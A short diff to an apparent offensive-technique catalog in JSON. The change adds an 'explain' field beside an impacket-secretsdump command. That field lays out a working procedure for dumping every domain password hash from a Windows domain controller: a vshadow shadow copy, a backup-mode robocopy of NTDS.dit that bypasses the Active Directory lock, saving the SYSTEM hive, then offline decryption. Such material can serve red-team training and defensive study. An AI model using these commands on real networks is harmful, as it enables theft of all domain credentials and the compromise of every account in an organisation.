@@ -141,5 +141,6 @@
       "label": "Extract all domain hashes offline",
       "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
     }
-  ]
+  ],
+  "explain": "Extracts every domain hash by shadow-copying the DC volume with the Windows SDK vshadow tool:\n  vshadow.exe -nw -p C:    create a persistent (-p), no-writers (-nw) shadow copy of C:\n  robocopy /b \\\\?\\GLOBALROOT\\...\\ntds.dit   copy NTDS.dit out of the snapshot in backup mode (bypasses the AD lock)\n  reg.exe save hklm\\system   save the SYSTEM hive for the boot key\n  impacket-secretsdump -ntds ... -system ... LOCAL   decrypt offline\nEnd result: NT hashes for the whole domain. diskshadow is a scriptable alternative."
 }
